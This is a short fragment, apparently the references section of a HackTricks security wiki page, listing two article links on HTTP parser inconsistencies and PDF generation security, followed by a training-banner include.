- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)

{{#include ../../banners/hacktricks-training.md}}
